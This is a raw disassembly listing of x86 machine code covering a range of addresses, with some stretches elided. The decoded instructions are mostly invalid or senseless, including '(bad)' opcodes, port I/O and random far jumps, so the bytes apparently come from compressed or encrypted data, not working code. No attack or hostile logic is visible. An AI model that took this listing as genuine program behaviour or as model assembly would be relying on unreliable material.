  428a44:	stos   DWORD PTR es:[edi],eax
  428a45:	rcr    DWORD PTR [ecx-0x5fed0f89],1
  428a4b:	addr16 mov ecx,0xaea2cb61
  428a51:	fadd   DWORD PTR [ebx]
  428a53:	push   ss
  428a54:	jae    0x428a4b
  428a56:	je     0x428a67
  428a58:	push   ds
  428a59:	xchg   ecx,eax
  428a5a:	add    DWORD PTR [esi-0x2726af2a],eax
  428a60:	xchg   edi,eax
  428a61:	fld    DWORD PTR [esi-0x75d6cabd]
  428a67:	push   ebp
  428a68:	les    eax,FWORD PTR [edi-0x76]
  428a6b:	icebp  
  428a6c:	nop
  428a6d:	test   DWORD PTR [eax],eax
	...
  428ad3:	add    BYTE PTR [eax],al
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x7d538613]
  428ae5:	test   BYTE PTR [edi-0x4c],ah
  428ae8:	add    DWORD PTR [eax],eax
  428aea:	add    BYTE PTR [ecx],al
  428aec:	add    BYTE PTR [eax],al
  428aee:	cdq    
  428aef:	popf   
  428af0:	lahf   
  428af1:	(bad)  
  428af2:	stc    
  428af3:	aad    0xb2
  428af5:	sub    al,0x56
  428af7:	adc    dh,BYTE PTR [ebx]
  428af9:	sub    DWORD PTR [edx],ebp
  428afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428afc:	fs pop ecx
  428afe:	stc    
  428aff:	out    dx,eax
  428b00:	fisttp DWORD PTR [ebp+0x2f]
  428b03:	xchg   ecx,eax
  428b04:	xor    DWORD PTR [edi],edi
  428b06:	ss in  eax,0xf0
  428b09:	jnp    0x428b7b
  428b0b:	arpl   WORD PTR [ebx+0x4bd3c864],bp
  428b11:	adc    BYTE PTR [esi+0x87d3d40],bl
  428b17:	retf   0x2352
  428b1a:	sub    eax,0xe30abf0d
  428b1f:	cmp    BYTE PTR [ecx+edi*4+0x74],dh
  428b23:	int3   
  428b24:	push   0x2d
  428b26:	pop    ebx
  428b27:	push   edx
  428b28:	pop    ebp
  428b2a:	dec    ecx
  428b2b:	inc    ebp
  428b2c:	xchg   ebp,eax
  428b2d:	mov    DWORD PTR [ebx],edi
  428b2f:	cmp    DWORD PTR [edx+0x1048e51],edx
  428b35:	dec    edi
  428b36:	dec    eax
  428b37:	mov    WORD PTR [ebx-0x44],?
  428b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b3b:	dec    eax
  428b3c:	je     0x428b71
  428b3e:	sbb    al,0xce
  428b40:	dec    ebx
  428b41:	les    ecx,FWORD PTR [eax-0x6ca19f21]
  428b47:	sahf   
  428b48:	mov    dl,0x9
  428b4a:	cmp    DWORD PTR [ecx],esi
  428b4c:	ss push ebx
  428b4e:	lods   eax,DWORD PTR ds:[esi]
  428b4f:	sahf   
  428b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b51:	or     DWORD PTR [eax+0x5774c45c],0x8bfe9fe2
  428b5b:	(bad)  
  428b5c:	lods   eax,DWORD PTR ds:[esi]
  428b5d:	mov    esi,0x24de4a97
  428b62:	inc    ecx
  428b63:	popf   
  428b64:	or     eax,esp
  428b66:	or     al,BYTE PTR [edx+0x66]
  428b69:	jno    0x428ba3
  428b6b:	and    al,0x42
  428b6d:	xchg   ebp,eax
  428b6e:	mov    edi,0x2ff90349
  428b73:	xor    ebx,ecx
  428b75:	xchg   ebx,eax
  428b76:	mov    ds:0xe21110fd,al
  428b7b:	(bad)  
  428b7c:	cli    
  428b7d:	jp     0x428ba3
  428b7f:	nop
  428b80:	ins    BYTE PTR es:[edi],dx
  428b81:	mov    ebp,0x87e4d585
  428b86:	or     BYTE PTR [edi],ch
  428b88:	in     al,0xf0
  428b8a:	ret    0x2fde
  428b8d:	rcl    DWORD PTR [esi],cl
  428b8f:	inc    ebx
  428b90:	inc    esi
  428b91:	mov    bh,0x41
  428b93:	mov    esi,0xfd661a5b
  428b98:	out    dx,al
  428b99:	lahf   
  428b9a:	lea    edx,[esi]
  428b9c:	xor    dh,BYTE PTR [ecx+ecx*8-0x28fa408e]
  428ba3:	dec    DWORD PTR [ebp-0x72e476f8]
  428ba9:	jmp    0x35a:0x6e44a17a
  428bb0:	rcl    DWORD PTR [edi+eax*1-0x774c590a],0x59
  428bb8:	imul   DWORD PTR [eax]
  428bba:	adc    DWORD PTR [bp+di],esi
  428bbd:	jno    0x428b5f
  428bbf:	sbb    BYTE PTR [edx-0x7d92bea1],dh
  428bc5:	mov    al,BYTE PTR [ebp-0x62]
  428bc8:	mov    ds:0x68fc8572,eax
  428bcd:	test   dl,0xcc
  428bd0:	leave  
  428bd1:	stos   DWORD PTR es:[edi],eax
  428bd2:	into   
  428bd3:	mov    eax,0xa49de1ab
  428bd8:	fimul  WORD PTR [ecx+ecx*2-0x311227a]
  428bdf:	pop    ds
  428be0:	jne    0x428be9
  428be2:	and    edx,esp
  428be4:	addr16 pop edx
  428be6:	push   ebx
  428be7:	repz in eax,0x61
  428bea:	or     BYTE PTR [ebx+0x31f2],cl
	...
  428c54:	add    BYTE PTR [eax],al
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x198a37ac
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [ebp+0x1c],bl
  428c70:	push   es
  428c71:	lock dec ecx
  428c73:	sub    DWORD PTR [ebx+0x4f879591],eax
  428c79:	mov    ecx,0xcc4e9d8b
  428c7e:	fwait
  428c7f:	cli    
  428c80:	xchg   ebx,eax
  428c81:	shl    BYTE PTR [edi-0x58766e73],cl
  428c87:	mov    bl,cl
  428c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c8a:	repnz dec edx
  428c8c:	sbb    DWORD PTR [ebx+0x2c6e3525],0xef172dc6
  428c96:	imul   esi,DWORD PTR [ebx-0x2879f547],0xffffffae
  428c9d:	bound  edx,QWORD PTR [edx+0x79967426]
  428ca3:	xor    BYTE PTR [esp+edx*1+0x4d],0x19
  428ca8:	pop    edx
  428ca9:	xchg   edi,eax
  428caa:	sub    edi,DWORD PTR [esi-0x3e769462]
  428cb0:	out    dx,al
  428cb1:	jle    0x428d1e
  428cb3:	dec    ebp
  428cb4:	loope  0x428ce4
  428cb6:	das    
  428cb7:	xchg   esi,eax
  428cb8:	and    eax,0x947af4ec
  428cbd:	stc    
  428cbe:	or     eax,0x30050ea1
  428cc3:	jge    0x428cc4
  428cc5:	add    al,0x98
  428cc7:	jmp    0x428c61
  428cc9:	enter  0xb0c7,0xac
  428ccd:	test   al,0x5f
  428ccf:	int3   
  428cd0:	fwait
  428cd1:	sbb    dh,BYTE PTR [edx]
  428cd3:	outs   dx,BYTE PTR ds:[esi]
  428cd4:	mov    dl,0xd7
  428cd6:	xor    BYTE PTR [ecx],dh
  428cd8:	ss jle 0x428d06
  428cdb:	xor    DWORD PTR [edi+0x7b],esp
  428cde:	enter  0xf3ff,0x15
  428ce2:	repnz (bad) 
  428ce4:	into   
  428ce5:	ffreep st(0)
  428ce7:	or     DWORD PTR [ebp+edi*4-0x2462eebb],esp
  428cee:	mov    ecx,0xbd41d732
  428cf3:	mov    edx,0xdb99aa1
  428cf8:	mov    al,0x88
  428cfa:	jecxz  0x428d59
  428cfc:	sub    BYTE PTR [ecx+0x75938cd0],bh
  428d02:	mov    dl,0x17
  428d04:	add    dl,BYTE PTR [ebp+0x71]
  428d07:	icebp  
  428d08:	pusha  
  428d09:	xchg   ebx,eax
  428d0a:	add    al,0x63
  428d0c:	nop
  428d0d:	imul   ecx,DWORD PTR [eax-0x4],0xc4082e49
  428d14:	mov    edx,0x84e39ba2
  428d19:	jns    0x428d5a
  428d1b:	jo     0x428d81
  428d1d:	mov    dl,0x96
  428d1f:	cmp    al,0x47
  428d21:	sub    al,0xcf
  428d23:	imul   BYTE PTR [ecx]
  428d25:	xlat   BYTE PTR ds:[ebx]
  428d26:	ins    DWORD PTR es:[edi],dx
  428d27:	cmp    eax,DWORD PTR [ecx+0x5ad13608]
  428d2d:	pop    ebx
  428d2e:	into   
  428d2f:	sub    al,0x93
  428d31:	adc    dl,BYTE PTR [edx+eax*2+0x596077e4]
  428d38:	sub    al,0x6a
  428d3a:	out    0xb9,eax
  428d3c:	rcr    BYTE PTR [eax+0x5e],1
  428d3f:	xchg   ebp,eax
  428d40:	add    BYTE PTR [ebx],ah
  428d42:	mov    DWORD PTR [ecx-0x23b0a617],esp
  428d48:	in     eax,0xe5
  428d4a:	cmpsd  xmm6,QWORD PTR [eax-0x19],0x62
  428d50:	jne    0x428d34
  428d52:	jg     0x428d03
  428d54:	sub    BYTE PTR [edx+edi*2],dl
  428d57:	inc    ecx
  428d58:	adc    BYTE PTR [edi+ebx*2],al
  428d5b:	sbb    DWORD PTR [edx-0x6f],ebx
  428d5e:	xor    DWORD PTR [esi-0x38fdc544],edx
  428d64:	aam    0xed
  428d66:	xchg   DWORD PTR [edi+0x25c0aaf2],edx
  428d6c:	adc    eax,ebx
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x72f9
  428de4:	add    esi,ecx
  428de6:	addr16 mov dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    bl,ah
  428def:	scas   al,BYTE PTR es:[edi]
  428df0:	jo     0x428e4c
  428df2:	inc    eax
  428df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428df4:	ffreep st(2)
  428df6:	bound  eax,QWORD PTR [ebx+0x78ba4f46]
  428dfc:	adc    esi,esp
  428dfe:	icebp  
  428dff:	jbe    0x428d8d
  428e01:	or     eax,0xc75e9335
  428e06:	clc    
  428e07:	call   0x68e1cbb6
  428e0c:	sbb    eax,0x60b7d1ec
  428e11:	out    dx,eax
  428e12:	dec    esp
  428e13:	add    edx,DWORD PTR ds:0x7683e0
  428e19:	out    dx,al
  428e1a:	pop    es
  428e1b:	(bad)  
  428e1c:	add    al,al
  428e1e:	std    
  428e1f:	loop   0x428e51
  428e21:	add    eax,0xdd1c2141
  428e26:	(bad)  
  428e27:	jecxz  0x428dc4
  428e29:	cwde   
  428e2a:	retf   
  428e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e2c:	jl     0x428db9
  428e2e:	or     cl,BYTE PTR [ebx-0x22]
  428e31:	mov    al,ds:0xc4706f7c
  428e36:	inc    esi
  428e37:	dec    eax
  428e38:	enter  0x2ab8,0xa4
  428e3c:	push   DWORD PTR [edi-0x7e921a1b]
  428e42:	mov    eax,ds:0x7db43d60
  428e47:	jbe    0x428e27
  428e49:	xor    eax,0xf9c885c7
  428e4e:	loope  0x428ecb
  428e50:	pushf  
  428e51:	out    dx,eax
  428e52:	jle    0x428e07
  428e54:	adc    edx,DWORD PTR [ebx+0x64]
  428e57:	mov    ebx,0xa3319121
  428e5c:	or     ah,al
  428e5e:	inc    edi
  428e5f:	xchg   BYTE PTR ds:0xff281db7,cl
  428e65:	fidiv  DWORD PTR [edx]
  428e67:	shl    BYTE PTR [ebx-0x535a4a4b],cl
  428e6d:	cmp    DWORD PTR [edi],0x6790425e
  428e73:	add    al,0x3c
  428e75:	mov    eax,0x40b0c43
  428e7a:	adc    ah,BYTE PTR [esi-0x1d5e364e]
  428e80:	shr    DWORD PTR [edi+esi*2-0x6a],1
  428e84:	add    eax,0x6fb4e111
  428e89:	cmp    DWORD PTR [edx-0x2189a954],esi
  428e8f:	mov    al,0xb6
  428e91:	jmp    0xddec:0x48a4d6b3
  428e98:	loopne 0x428e4a
  428e9a:	push   0xa1bdc7d1
  428e9f:	inc    edi
  428ea0:	inc    edi
  428ea1:	xchg   esi,eax
  428ea2:	pop    ecx
  428ea3:	iret   
  428ea4:	test   BYTE PTR [ebp-0x732b9b1],dl
  428eaa:	mov    ebp,cs
  428eac:	inc    edx
  428ead:	jge    0x428e35
  428eaf:	test   BYTE PTR [edx],dh
  428eb1:	lahf   
  428eb2:	mov    al,0xf1
  428eb4:	ss dec edi
  428eb6:	inc    edx
  428eb7:	xchg   esi,eax
  428eb8:	popa   
  428eb9:	xlat   BYTE PTR ds:[ebx]
  428eba:	mov    WORD PTR [ebp+ebx*2-0x65],ss
  428ebe:	jb     0x428e47
  428ec0:	push   0x17d1d408
  428ec5:	sub    DWORD PTR [ecx-0x77],ecx
  428ec8:	jmp    0x428f2a
  428eca:	int3   
  428ecb:	sub    esp,0xecc703fa
  428ed1:	dec    edi
  428ed2:	in     eax,dx
  428ed3:	or     eax,0x4756c7c5
  428ed8:	mov    ebx,0xd8f8127f
  428edd:	js     0x428f3e
  428edf:	pop    edi
  428ee0:	cmp    eax,0xb6267363
  428ee5:	ins    BYTE PTR es:[edi],dx
  428ee6:	(bad)  
  428ee7:	pusha  
  428ee8:	shr    ebx,1
  428eea:	lahf   
  428eeb:	inc    edi
  428eec:	or     cl,BYTE PTR [edx+0x0]
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0xbc
  428f63:	inc    ebx
  428f64:	inc    edi
  428f65:	and    al,0x67
  428f67:	mov    bh,0x1
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    ah,bh
  428f6f:	xor    al,0x3b
  428f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f72:	js     0x428fba
  428f74:	mov    ah,0x3
  428f76:	mov    eax,DWORD PTR [edi]
  428f78:	les    esp,FWORD PTR [eax+0x4ba8d495]
  428f7e:	stc    
  428f7f:	xor    al,0x7a
  428f81:	sbb    DWORD PTR [eax],ebp
  428f83:	js     0x428f82
  428f85:	ror    BYTE PTR [eax],1
  428f87:	nop
  428f88:	xchg   DWORD PTR [edx],eax
  428f8a:	and    al,0xac
  428f8c:	retf   
  428f8d:	pop    esi
  428f8e:	push   0xffffff9b
  428f90:	xchg   ebx,eax
  428f91:	and    edi,ecx
  428f93:	das    
  428f94:	stos   DWORD PTR es:[edi],eax
  428f95:	aad    0xd8
  428f97:	cwde   
  428f98:	popa   
  428f99:	lods   al,BYTE PTR ds:[esi]
  428f9a:	mov    dh,0x26
  428f9c:	mov    edx,ebp
  428f9e:	xchg   esi,eax
  428f9f:	dec    edx
  428fa0:	cs aas 
  428fa2:	(bad)  
  428fa3:	jns    0x428f3c
  428fa5:	cmp    eax,DWORD PTR [ecx]
  428fa7:	mov    ecx,0xdaa6d553
  428fac:	xchg   ebp,eax
  428fad:	lock xchg ebx,eax
  428faf:	mov    WORD PTR [edx-0x7e263e23],cs
  428fb5:	nop
  428fb6:	xchg   edx,eax
  428fb7:	je     0x428fde
  428fb9:	sbb    al,0xf5
  428fbb:	sub    edx,ebx
  428fbd:	cs aas 
  428fbf:	ja     0x428fa6
  428fc1:	mov    WORD PTR [edx+0x74],?
  428fc4:	dec    ebp
  428fc5:	pop    ecx
  428fc6:	popa   
  428fc7:	pop    ecx
  428fc8:	push   ebp
  428fc9:	push   ds
  428fca:	cmp    DWORD PTR [esi],0x70
  428fcd:	enter  0x9976,0xa6
  428fd1:	loop   0x428f60
  428fd3:	dec    ebx
  428fd4:	les    ecx,FWORD PTR [ebx+edi*1]
  428fd7:	mov    al,0x88
  428fd9:	je     0x428fe1
  428fdb:	inc    ecx
  428fdc:	add    esi,eax
  428fde:	lahf   
  428fdf:	ja     0x42901a
  428fe1:	add    ebx,DWORD PTR [ebp-0x5cf52b3d]
  428fe7:	xor    al,0x43
  428fe9:	jle    0x428fbe
  428feb:	fidiv  WORD PTR [edx+0x1d]
  428fee:	ds jp  0x428fc7
  428ff1:	scas   eax,DWORD PTR es:[edi]
  428ff2:	mov    ecx,0x9942a178
  428ff7:	push   ecx
  428ff8:	mov    eax,0xc411698e
  428ffd:	jle    0x42902b
  428fff:	or     ebx,DWORD PTR [edx-0x65]
  429002:	scas   al,BYTE PTR es:[edi]
  429003:	adc    ecx,DWORD PTR ds:0xb1784fcd
  429009:	xchg   esi,eax
  42900a:	(bad)  
  42900b:	lahf   
  42900c:	retf   0x2e42
  42900f:	fs ret 
  429011:	test   eax,0x3e408c70
  429016:	es sbb eax,0x418860b0
  42901c:	ret    
  42901d:	mov    eax,ds:0xa636e65f
  429022:	jno    0x429000
  429024:	pop    edx
  429025:	dec    eax
  429026:	mov    ds:0x20edf65a,eax
  42902b:	push   ecx
  42902c:	dec    esi
  42902d:	add    dl,BYTE PTR [eax-0x51]
  429030:	and    dl,BYTE PTR [ebx+0x29ac885b]
  429036:	sti    
  429037:	xchg   DWORD PTR [eax],edi
  429039:	nop
  42903a:	or     DWORD PTR [ebx+0x25],0xffffffa3
  42903e:	enter  0x1b01,0x53
  429042:	dec    edi
  429043:	idiv   DWORD PTR [ebp-0x2b]
  429046:	adc    al,0xac
  429048:	lock mov al,ds:0x1b3e460e
  42904e:	jae    0x429040
  429050:	bound  edi,QWORD PTR [edi]
  429052:	pop    esi
  429053:	add    al,0xdf
  429055:	jb     0x4290b2
  429057:	lds    ecx,FWORD PTR [edx]
  429059:	xor    DWORD PTR [ecx+0x26],ebx
  42905c:	mov    ch,0x5e
  42905e:	xor    dl,BYTE PTR [edi+0x64]
  429061:	dec    eax
  429062:	mov    ah,BYTE PTR [edx-0x1b]
  429065:	push   ebp
  429066:	jb     0x429083
  429068:	and    esi,ecx
  42906a:	outs   dx,BYTE PTR ds:[esi]
  42906b:	xor    eax,0x7712
	...
  4290d4:	add    BYTE PTR [eax],al
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0xd2fc7b77
  4290e3:	mov    ds:0xb86741b1,eax
  4290e8:	add    DWORD PTR [eax],eax
  4290ea:	add    BYTE PTR [ecx],al
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	push   cs
  4290ef:	adc    DWORD PTR [esi],0xbc5cf0bc
  4290f5:	cmp    esi,DWORD PTR [esi]
  4290f7:	ja     0x4290a5
  4290f9:	and    eax,0x67cbafcf
  4290fe:	pop    ss
  4290ff:	or     esi,DWORD PTR [esi]
  429101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429102:	sbb    ebx,edi
  429104:	and    cl,BYTE PTR [edi+edi*2+0x15]
  429108:	mov    ds:0xf562ba4e,al
  42910d:	jno    0x429140
  42910f:	jb     0x4290a1
  429111:	xchg   edi,eax
  429112:	ja     0x429095
  429114:	sub    ch,BYTE PTR [ecx]
  429116:	aad    0xb0
  429118:	push   esp
  429119:	test   al,0x15
  42911b:	ins    DWORD PTR es:[edi],dx
  42911c:	out    dx,al
  42911d:	xchg   edi,eax
  42911e:	lea    ebx,[ecx]
  429120:	(bad)  
  429121:	and    al,0x45
  429123:	aam    0x78
  429125:	push   ds
  429126:	clc    
  429127:	icebp  
  429128:	psadbw mm4,mm1
  42912b:	jl     0x4290fd
  42912d:	sbb    ebp,DWORD PTR [edi]
  42912f:	ins    DWORD PTR es:[edi],dx
  429130:	jo     0x4290e7
  429132:	sbb    ch,bl
  429134:	es int 0x80
  429137:	(bad)  [edx]
  429139:	or     eax,0x4121810b
  42913e:	add    eax,0x91bb1fec
  429143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429144:	and    al,0x48
  429146:	push   ebp
  429147:	pushf  
  429148:	mov    ebx,0x73d00359
  42914d:	nop
  42914e:	cwde   
  42914f:	sbb    esp,esi
  429151:	mov    ecx,0x38b42187
  429156:	jo     0x4290f3
  429158:	out    dx,eax
  429159:	xor    al,0xe4
  42915b:	jg     0x4291a3
  42915d:	les    ebp,FWORD PTR [ecx+edx*4+0x75e93848]
  429164:	pop    esi
  429165:	addr16 inc eax
  429167:	in     eax,dx
  429168:	aad    0x3f
  42916a:	and    eax,DWORD PTR [eax+edx*4+0x3d8c7e5d]
  429171:	mov    ebp,0xffd5bfef
  429176:	inc    esp
  429177:	push   edx
  429178:	lahf   
  429179:	imul   ebp,DWORD PTR [edi-0x6e],0x7978fa80
  429180:	xor    edi,DWORD PTR [edx+0x6afc6ea5]
  429186:	dec    esp
  429187:	rcl    DWORD PTR [bx+di+0x60],cl
  42918b:	pop    edi
  42918c:	inc    edx
  42918d:	clc    
  42918e:	jp     0x4291ae
  429190:	outs   dx,DWORD PTR ds:[esi]
  429191:	fnsave [ecx]
  429193:	pushf  
  429194:	leave  
  429195:	pop    es
  429196:	imul   BYTE PTR [ecx-0x48]
  429199:	xor    esi,edi
  42919b:	ficomp DWORD PTR ds:0x2045e1d8
  4291a1:	pop    edi
  4291a2:	xor    bh,BYTE PTR [edx]
  4291a4:	or     bl,bh
  4291a6:	inc    edx
  4291a7:	sahf   
  4291a8:	es (bad) 
  4291aa:	(bad)  
  4291ab:	mov    al,ds:0xf1c45d91
  4291b0:	dec    edx
  4291b1:	sbb    DWORD PTR [ecx+esi*8-0x2b],ecx
  4291b5:	test   BYTE PTR [edi+edi*4-0x5d],bh
  4291b9:	jnp    0x429232
  4291bb:	add    ebp,DWORD PTR [ebp-0x40c31a5b]
  4291c1:	sub    ah,BYTE PTR [ebx-0x7]
  4291c4:	sbb    edx,DWORD PTR [edx]
  4291c6:	mov    ah,0x6c
  4291c8:	(bad)  
  4291c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291ca:	pop    edx
  4291cb:	outs   dx,DWORD PTR ds:[esi]
  4291cc:	lods   eax,DWORD PTR ds:[esi]
  4291cd:	retf   0xd958
  4291d0:	iret   
  4291d1:	(bad)  
  4291d2:	test   esi,0x77b60502
  4291d8:	outs   dx,BYTE PTR es:[esi]
  4291da:	push   esp
  4291db:	sar    DWORD PTR [ecx*8+0x6dd42133],1
  4291e2:	inc    ebp
  4291e3:	std    
  4291e4:	dec    ecx
  4291e5:	stc    
  4291e6:	jg     0x4291ae
  4291e8:	xchg   ecx,eax
  4291e9:	mov    bh,BYTE PTR [edi]
  4291eb:	out    dx,al
  4291ec:	or     eax,0x2d
	...
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [edi+eax*1+0x674129d3],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    cl,bh
  42926f:	(bad)  
  429270:	jb     0x4292a3
  429272:	jno    0x429219
  429274:	int    0x71
  429276:	pop    ss
  429277:	adc    al,0xed
  429279:	add    al,BYTE PTR [ecx-0x22]
  42927c:	jno    0x42924d
  42927e:	xchg   ebx,eax
  42927f:	enter  0x1407,0xd9
  429283:	dec    esp
  429284:	adc    BYTE PTR [ebx+0x4a6b3051],bh
  42928a:	int    0x5a
  42928c:	pusha  
  42928d:	test   eax,0x2351515c
  429292:	jge    0x42929c
  429294:	in     al,dx
  429295:	lods   eax,DWORD PTR ds:[esi]
  429296:	jne    0x429266
  429298:	push   es
  429299:	cmp    al,0xd7
  42929b:	jmp    DWORD PTR [ecx-0x56]
  42929e:	outs   dx,BYTE PTR ds:[esi]
  42929f:	push   esp
  4292a0:	jecxz  0x42924a
  4292a2:	in     al,dx
  4292a3:	push   edi
  4292a4:	jge    0x42930f
  4292a6:	rcl    esi,0x94
  4292a9:	add    edx,ebp
  4292ab:	(bad)  
  4292ac:	pop    ecx
  4292ad:	fnsave [eax+0x7afad0eb]
  4292b3:	aas    
  4292b4:	ret    0x7fc3
  4292b7:	xchg   DWORD PTR [edx],ebx
  4292b9:	(bad)  
  4292ba:	or     dl,ah
  4292bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292bd:	iret   
  4292be:	mov    dl,dl
  4292c0:	cmc    
  4292c1:	cmp    al,0x1a
  4292c3:	scas   eax,DWORD PTR es:[edi]
  4292c4:	call   0x3494:0x42300c3e
  4292cb:	es (bad) 
  4292cd:	cdq    
  4292ce:	daa    
  4292cf:	bound  eax,QWORD PTR [ecx+0x253c2819]
  4292d5:	jne    0x429301
  4292d7:	(bad)  
  4292d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292d9:	outs   dx,BYTE PTR ds:[esi]
  4292da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292db:	jl     0x429349
  4292dd:	(bad)  
  4292de:	push   esi
  4292df:	pop    esp
  4292e0:	(bad)  
  4292e1:	jg     0x429300
  4292e3:	fsubrp st(5),st
  4292e5:	mov    esp,0x9833ce9e
  4292ea:	and    DWORD PTR [ebx],edx
  4292ec:	and    DWORD PTR [edi+0x10],esi
  4292ef:	sub    DWORD PTR [esi-0x21],edi
  4292f2:	dec    ebp
  4292f3:	mov    DWORD PTR [edx],ebx
  4292f5:	mov    ds:0x285c306b,eax
  4292fa:	(bad)  
  4292fb:	out    dx,al
  4292fc:	push   esi
  4292fd:	retf   
  4292fe:	popf   
  4292ff:	loopne 0x429349
  429301:	test   al,0x5e
  429303:	cmp    BYTE PTR [edx+eiz*8],dl
  429306:	fs ss mov dh,0x52
  42930a:	mov    esp,0x5ffd2ec1
  42930f:	xor    esi,edx
  429311:	push   ds
  429312:	fst    DWORD PTR [esi]
  429314:	pop    esi
  429315:	jmp    0x42931b
  429317:	push   0xffffff9b
  429319:	xor    ah,0xf4
  42931c:	mov    ch,0x89
  42931e:	in     al,0x6e
  429320:	push   ds
  429321:	inc    ebx
  429322:	xor    bh,cl
  429324:	and    al,BYTE PTR [eax-0x31]
  429327:	cs xor cl,dl
  42932a:	push   esi
  42932b:	jnp    0x4292f0
  42932d:	or     BYTE PTR fs:[ebx+0x6cb10430],ah
  429334:	dec    eax
  429335:	dec    esi
  429336:	(bad)  
  429337:	out    0xe5,al
  429339:	jo     0x42930c
  42933b:	push   cs
  42933c:	jecxz  0x429363
  42933e:	mov    ds:0xc897a5f2,eax
  429343:	iret   
  429344:	push   ebp
  429345:	mov    ecx,0xdcc8d0dc
  42934a:	dec    esi
  42934b:	dec    eax
  42934c:	bnd jbe 0x429379
  42934f:	sar    BYTE PTR [edx],0x6c
  429352:	btr    DWORD PTR [edx],edi
  429355:	mov    eax,ds:0x5e81b55
  42935a:	jns    0x42939e
  42935c:	inc    esi
  42935d:	shr    ch,0x67
  429360:	mov    ebp,0xc79d11f9
  429365:	pop    edi
  429366:	xor    eax,0x9d6a6282
  42936b:	clc    
  42936c:	add    ah,BYTE PTR [edi]
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xea
  4293e3:	dec    ebp
  4293e4:	jno    0x42938c
  4293e6:	addr16 mov edx,0x1000001
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	(bad)  
  4293ef:	pop    esp
  4293f0:	push   ebx
  4293f1:	dec    eax
  4293f2:	pop    es
  4293f3:	(bad)  
  4293f4:	(bad)  
  4293f5:	mov    dh,0x91
  4293f7:	aas    
  4293f8:	clc    
  4293f9:	add    BYTE PTR [esi-0x2a],ch
  4293fc:	test   eax,0xd483b445
  429401:	sub    dl,dl
  429403:	daa    
  429404:	imul   ebx,DWORD PTR [edi-0x2d1e7681],0x4e37b2ea
  42940e:	rol    BYTE PTR [eax-0x384af765],1
  429414:	mov    ds:0x1a5bba88,eax
  429419:	stc    
  42941a:	push   edx
  42941b:	test   eax,0x1294833c
  429420:	adc    BYTE PTR [esi],ah
  429422:	adc    ch,dl
  429424:	fsubr  DWORD PTR [esi+ebp*8-0x5267515e]
  42942b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42942c:	mov    dl,0xdc
  42942e:	cs mov esi,0x4fc18870
  429434:	js     0x4293ef
  429436:	mov    ds:0x321f2892,al
  42943b:	or     eax,0xbead3108
  429440:	mov    dh,0x24
  429442:	hlt    
  429443:	pop    ebx
  429444:	sbb    ebp,edx
  429446:	push   es
  429447:	jb     0x4293cc
  429449:	xor    eax,0x6f80f2b4
  42944e:	loop   0x42947b
  429450:	mov    al,ds:0x97d36bf5
  429455:	xor    al,0x8f
  429457:	jns    0x429461
  429459:	mov    ecx,0x35556ca0
  42945e:	and    ecx,DWORD PTR [ebx+0x17]
  429461:	add    eax,0x835d4c87
  429466:	or     BYTE PTR [ecx-0x76],bl
  429469:	mov    es,WORD PTR [ebp+0x6077ab63]
  42946f:	cmp    al,0xaf
  429471:	js     0x429417
  429473:	or     DWORD PTR [ebx],esp
  429475:	cdq    
  429476:	xchg   cl,ah
  429478:	fs xchg edx,eax
  42947a:	xchg   edx,eax
  42947b:	xchg   ebx,eax
  42947c:	pop    ebx
  42947d:	cli    
  42947e:	mov    cl,0x64
  429480:	and    bl,BYTE PTR [edi-0x1]
  429483:	adc    edi,DWORD PTR [edx-0x2d0068ba]
  429489:	adc    eax,0xdf25bf70
  42948e:	cmc    
  42948f:	out    0x87,eax
  429491:	push   edi
  429492:	xor    esi,DWORD PTR [esi-0x43]
  429495:	adc    eax,eax
  429497:	push   edi
  429498:	jnp    0x429487
  42949a:	in     eax,0xa
  42949c:	mov    ebx,0x8ee274a
  4294a1:	and    eax,0xb230e24f
  4294a6:	and    al,0x42
